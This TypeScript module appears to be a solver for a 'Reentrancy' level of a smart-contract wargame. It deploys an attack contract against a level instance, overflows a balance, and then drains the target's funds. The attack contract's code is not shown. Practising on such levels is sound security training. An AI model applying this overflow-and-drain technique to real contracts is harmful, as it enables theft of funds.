import { ReentrancyAttack } from '../../typechain-types';
import { EthereumClient } from '../ethereum/ethereum-client';
import { Attacker } from './attacker-provider';

export const REENTRANCY_LEVEL_NAME = "Reentrancy"

export const reentrancyAttacker = (): Attacker => {
    return {
        attack: async (ethereum: EthereumClient, instanceAddress: string) => {

            console.log('Deploying ReentrancyAttacker.');
            const contract = await ethereum.deployContract<ReentrancyAttack>('ReentrancyAttack', [instanceAddress]);

            console.log('Attacker deployed at: ', await contract.getAddress(), ' Perfoming the attack');

            const tx1 = await contract.attack_1_causeOverflow({value: 1});
            await tx1.wait();

            console.log('Balance overflown, depleting the target contract');
            const tx2 = await contract.attack_2_deplete();
            await tx2.wait();
        }
    }
}